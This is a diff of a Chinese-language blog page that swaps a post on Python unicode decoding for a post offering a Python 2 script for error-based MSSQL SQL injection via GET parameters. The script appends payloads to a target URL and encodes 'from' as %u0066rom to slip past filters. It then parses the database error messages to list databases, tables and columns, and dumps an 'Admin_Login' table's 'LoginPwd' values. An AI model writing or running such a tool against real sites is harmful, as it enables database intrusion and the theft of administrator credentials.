@@ -80,19 +80,28 @@
 
 
 
-<meta name="description" content="转：http://windkeepblow.blog.163.com/blog/static/1914883312013988185783/
-如题，其实我的问题很简单，就是在写爬虫的时候拿到网页的信息包含类似“\u65b0\u6d6a\u5fae\u535a\u6ce8\u518c”的字符串，实际上这是unicode的中文编码，对应的中文为“新浪微博注册”。其实我就是想找一个函数让这一串东西显示中">
+<meta name="description" content="在进行mssql注入的时候，由于各种各样的原因，我们不能使用工具进行值得获取，那么可以自行编写脚本来获取值，python由于其良好的抓取网页的功能，被大家广泛使用。
+对于get型的mssql的报错注入,代码如下：[python]
+#! /usr/bin/env python
+#coding=utf-8import reimport urllibimport urllib2
+#从访问链接中获取报错信">
 <meta property="og:type" content="article">
-<meta property="og:title" content="python unicode字节串转成中文问题  （转）">
-<meta property="og:url" content="http://yoursite.com/2015/06/18/python-unicode-e5-ad-97-e8-8a-82-e4-b8-b2-e8-bd-ac-e6-88-90-e4-b8-ad-e6-96-87-e9-97-ae-e9-a2-98-ef-bc-88-e8-bd-ac-ef-bc-89/index.html">
+<meta property="og:title" content="基于mssql的报错注入的脚本(get)">
+<meta property="og:url" content="http://yoursite.com/2015/04/07/基于mssql的报错注入的脚本(get)/index.html">
 <meta property="og:site_name" content="wps2015的博客">
-<meta property="og:description" content="转：http://windkeepblow.blog.163.com/blog/static/1914883312013988185783/
-如题，其实我的问题很简单，就是在写爬虫的时候拿到网页的信息包含类似“\u65b0\u6d6a\u5fae\u535a\u6ce8\u518c”的字符串，实际上这是unicode的中文编码，对应的中文为“新浪微博注册”。其实我就是想找一个函数让这一串东西显示中">
-<meta property="og:updated_time" content="2016-04-13T01:36:32.903Z">
+<meta property="og:description" content="在进行mssql注入的时候，由于各种各样的原因，我们不能使用工具进行值得获取，那么可以自行编写脚本来获取值，python由于其良好的抓取网页的功能，被大家广泛使用。
+对于get型的mssql的报错注入,代码如下：[python]
+#! /usr/bin/env python
+#coding=utf-8import reimport urllibimport urllib2
+#从访问链接中获取报错信">
+<meta property="og:updated_time" content="2016-04-13T01:36:32.902Z">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:title" content="python unicode字节串转成中文问题  （转）">
-<meta name="twitter:description" content="转：http://windkeepblow.blog.163.com/blog/static/1914883312013988185783/
-如题，其实我的问题很简单，就是在写爬虫的时候拿到网页的信息包含类似“\u65b0\u6d6a\u5fae\u535a\u6ce8\u518c”的字符串，实际上这是unicode的中文编码，对应的中文为“新浪微博注册”。其实我就是想找一个函数让这一串东西显示中">
+<meta name="twitter:title" content="基于mssql的报错注入的脚本(get)">
+<meta name="twitter:description" content="在进行mssql注入的时候，由于各种各样的原因，我们不能使用工具进行值得获取，那么可以自行编写脚本来获取值，python由于其良好的抓取网页的功能，被大家广泛使用。
+对于get型的mssql的报错注入,代码如下：[python]
+#! /usr/bin/env python
+#coding=utf-8import reimport urllibimport urllib2
+#从访问链接中获取报错信">
 
 
 
@@ -110,7 +119,7 @@
   };
 </script>
 
-  <title> python unicode字节串转成中文问题  （转） | wps2015的博客 </title>
+  <title> 基于mssql的报错注入的脚本(get) | wps2015的博客 </title>
 </head>
 
 <body itemscope itemtype="http://schema.org/WebPage" lang="zh-Hans">
@@ -250,7 +259,7 @@
             
             
               
-                python unicode字节串转成中文问题  （转）
+                基于mssql的报错注入的脚本(get)
               
             
           </h1>
@@ -262,8 +271,8 @@
               <i class="fa fa-calendar-o"></i>
             </span>
             <span class="post-meta-item-text">发表于</span>
-            <time itemprop="dateCreated" datetime="2015-06-18T10:14:26+08:00" content="2015-06-18">
-              2015-06-18
+            <time itemprop="dateCreated" datetime="2015-04-07T21:02:13+08:00" content="2015-04-07">
+              2015-04-07
             </time>
           </span>
 
@@ -309,12 +318,26 @@
       
 
       
-        <p>转：<a href="http://windkeepblow.blog.163.com/blog/static/1914883312013988185783/" target="_blank" rel="external">http://windkeepblow.blog.163.com/blog/static/1914883312013988185783/</a></p>
-<p>如题，其实我的问题很简单，就是在写爬虫的时候拿到网页的信息包含类似“\u65b0\u6d6a\u5fae\u535a\u6ce8\u518c”的字符串，实际上这是unicode的中文编码，对应的中文为“新浪微博注册”。其实我就是想找一个函数让这一串东西显示中文而已，没想到百度了白天找到合适的。遇到这种问题千万不要用什么 “python编码” “unicode中文编码” “unicode解码”这样的关键字去搜，一大堆网页出来毫不相关。</p>
-<p>其实这个问题一个函数搞定，如下：</p>
-<p>Example 1:<br>&gt;&gt;&gt; s = r”\u65b0\u6d6a\u5fae\u535a\u6ce8\u518c”<br>&gt;&gt;&gt; s<br>‘\u65b0\u6d6a\u5fae\u535a\u6ce8\u518c’<br>&gt;&gt;&gt; print s<br>\u65b0\u6d6a\u5fae\u535a\u6ce8\u518c<br>&gt;&gt;&gt; s = s.decode(“unicode_escape”); #就是这个函数<br>&gt;&gt;&gt; print s</p>
-<p>Example 2:<br>&gt;&gt;&gt; str<em> = “Russopho\xe9bic, clichd and just pl\xe9ain stupid.”<br>&gt;&gt;&gt; print str</em><br>Russopho?bic, clichd and just pl?ain stupid.<br>&gt;&gt;&gt; str<em> = str</em>.decode(“unicode<em>escape”)<br>&gt;&gt;&gt; print str</em></p>
-<div><br><div></div><br><div>(这个方法解决了我在插入数据到mongodb时遇到的“bson.errors.InvalidStringData: strings in documents must be valid UTF-8”问题)</div><br><div></div><br><div>    附上关于这个问题的相关博客链接：<a href="http://www.cnblogs.com/yangze/archive/2010/11/16/1878469.html" target="_blank" rel="external">http://www.cnblogs.com/yangze/archive/2010/11/16/1878469.html</a></div><br><div></div><br><div>        另外还有一个与unicode字节串有关的问题，遇到这样的错误提示：Unicode equal comparison failed to convert both arguments to Unicode - interpreting them as being unequal。说明我们在对两个字符（串）进行对比的时候等号两边的类型</div><br><div>不一样，可能是一边是unicode字节串，一边是字符串。详见<a href="http://stackoverflow.com/questions/3400171/python-utf-8-comparison。" target="_blank" rel="external">http://stackoverflow.com/questions/3400171/python-utf-8-comparison。</a></div><br><div></div><br><div>小结：<br>以后遇到奇葩问题要想好关键字再搜，不然很有可能一无所获。</div><br></div>
+        <p>在进行mssql注入的时候，由于各种各样的原因，我们不能使用工具进行值得获取，那么可以自行编写脚本来获取值，python由于其良好的抓取网页的功能，被大家广泛使用。</p>
+<p>对于get型的mssql的报错注入,代码如下：<br>[python]</p>
+<p>#! /usr/bin/<br>env python</p>
+<p>#coding=utf-8<br>import re<br>import urllib<br>import urllib2</p>
+<p>#从访问链接中获取报错信息</p>
+<p>def getcontent(payload):  #获取网页内容<br>    url1=url+”AND (“+payload+”)=1 — “<br>    content = urllib.urlopen(url1).read()<br>    print content<br>    return  content</p>
+<p>#从报错回显中提取数值<br>def getdata(content):<br>    patt = re.compile(“nvarchar.<em>?’(.</em>?)’.*?int”)<br>    data = patt.findall(content)<br>    if data:<br>        return data[0]<br>    else:<br>        return None</p>
+<p>#获取当前数据库名<br>def getcurrentdb():<br>    payload = ‘db_name()’<br>    content = getcontent(payload)<br>    data = getdata(content)<br>    print “current_db: “+data<br>    return data<br>def gettablename(dbname,n):  #获取表名<br>    tablelist1=[]<br>    for i in range(n):<br>        payload = “select top 1 name %u0066rom “+dbname+”.dbo.sysobjects where xtype=’U’ and name  not in(select top “+str(i)+” name %u0066rom “+dbname+”.dbo.sysobjects where xtype=’U’ order by name) order by name”<br>        try:<br>            content = getcontent(payload)<br>            data = getdata(content)</p>
+<pre><code>        #print data
+        if data not in tablelist1:
+            tablelist1.append(data)
+        else:
+            break
+    except:
+        continue
+print tablelist1
+print &apos;--------------------&apos;
+</code></pre><p>def getcolumns(dbname,table,n):  #获取列名<br>    tablelist2=[]<br>    for i in range(n):<br>        payload=”Select top 1 name %u0066rom “+dbname+”.dbo.SysColumns Where id=Object_Id(‘“+table+”‘) and name not in (Select top “+str(i)+” Name %u0066rom “+dbname+”.dbo.SysColumns Where id=Object_Id(‘“+table+”‘) order by name) order by name”<br>        try:<br>            content = getcontent(payload)<br>            data = getdata(content)<br>            if  data not in tablelist2:<br>                tablelist2.append(data)<br>            else:<br>                break<br>        except:<br>            continue<br>    print table<br>    print tablelist2<br>    print ‘——————–’<br>def getvalue(dbname,table,column,n):  #获取各字段的值<br>    tablelist3=[]<br>    for i in range(n):<br>        payload=”select top 1 “+column+” %u0066rom “+table+” where “+column+” not in(select top  “+str(i)+” “+column+” %u0066rom “+table+” order by  id)order by id”<br>        try:<br>            content = getcontent(payload)<br>            data = getdata(content)<br>            if  data  not in tablelist3:<br>                tablelist3.append(data)<br>            else:<br>                break<br>        except:<br>            continue<br>    print column<br>    print tablelist3</p>
+<p>if <strong>name</strong> == “<strong>main</strong>“:<br>    url=”<a href="http://www.example/pages/BulletinPage.aspx?id=21" target="_blank" rel="external">http://www.example/pages/BulletinPage.aspx?id=21</a>“<br>    global url<br>    db=getcurrentdb()<br>    gettablename(‘saa’,200)<br>    getcolumns(db,’Admin_Login’,50)<br>    getvalue(db,’Admin_Login’,’LoginPwd’,50)   #可自行选择注释，只留你需要的那个函数进行值得获取<br>[/python]</p>
+
       
     </div>
     
@@ -343,16 +366,16 @@
         <div class="post-nav">
           <div class="post-nav-next post-nav-item">
             
-              <a href="/2015/05/28/e5-bf-98-e8-ae-b0-e5-af-86-e7-a0-81-e5-92-8b-e5-8a-9e-ef-bc-9f-e6-9c-ac-e5-9c-b0-e5-af-86-e7-a0-81-e6-a3-80-e7-b4-a2-e5-b7-a5-e5-85-b7-lazagne-project/" rel="next" title="忘记密码咋办？本地密码检索工具 – LaZagne Project">
-                <i class="fa fa-chevron-left"></i> 忘记密码咋办？本地密码检索工具 – LaZagne Project
+              <a href="/2015/04/06/HTTP请求头信息的注入/" rel="next" title="HTTP请求头信息的注入">
+                <i class="fa fa-chevron-left"></i> HTTP请求头信息的注入
               </a>
             
           </div>
 
           <div class="post-nav-prev post-nav-item">
             
-              <a href="/2015/07/13/dns-e5-9f-9f-e4-bc-a0-e9-80-81-e6-bc-8f-e6-b4-9e-e5-88-a9-e7-94-a8-e6-96-b9-e6-b3-95/" rel="prev" title="DNS域传送漏洞利用方法">
-                DNS域传送漏洞利用方法 <i class="fa fa-chevron-right"></i>
+              <a href="/2015/05/21/PHP5.5使用Bcrypt加密密码/" rel="prev" title="PHP5.5使用Bcrypt加密密码">
+                PHP5.5使用Bcrypt加密密码 <i class="fa fa-chevron-right"></i>
               </a>
             
           </div>
